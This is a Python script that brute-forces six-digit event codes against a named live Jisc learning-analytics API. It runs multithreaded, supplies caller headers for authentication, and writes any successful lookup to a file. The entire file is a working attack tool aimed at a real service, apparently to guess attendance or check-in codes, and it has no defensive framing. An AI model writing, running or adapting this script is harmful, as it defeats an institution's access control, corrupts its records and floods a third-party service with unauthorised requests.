import requests
import concurrent.futures

class JiscCodeBreaker:
    def __init__(self, headers, eventId, searchValueLow=0, searchValueHigh=999999, threadCount=10):
        self.eventId = eventId
        self.threadCount = threadCount
        self.headers = headers
        self.searchValueLow = searchValueLow
        self.searchValueHigh = searchValueHigh
        self.url_template = "https://api.la.jisc.ac.uk/event/lookup/{:06d}?id={}"

    def CheckResponse(self, number):
        url = self.url_template.format(number, self.eventId)
        try:
            response = requests.get(url, headers=self.headers)
            print(f"Checking number: {str(number).zfill(6)}")
            if response.status_code == 200 and response.json() != {"error": "Something went wrong"}:
                print(f"Success with number: {number}")
                with open('success.txt', 'a') as f:
                    f.write(f"Success with number: {number}\n")
                    f.write(f"{response.json()}\n\n")
                return True
        except Exception as e:
            print(f"Error with number {number}: {e}")
        return False

    def GetCode(self):
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threadCount) as executor:
            futures = [executor.submit(self.CheckResponse, number) for number in range(self.searchValueLow, self.searchValueHigh + 1)]
            for future in concurrent.futures.as_completed(futures):
                try:
                    if future.result():
                        print("Code found, stopping further checks.")
                        executor.shutdown(wait=False)
                        break
                except Exception as e:
                    print(f"Error in thread: {e}")
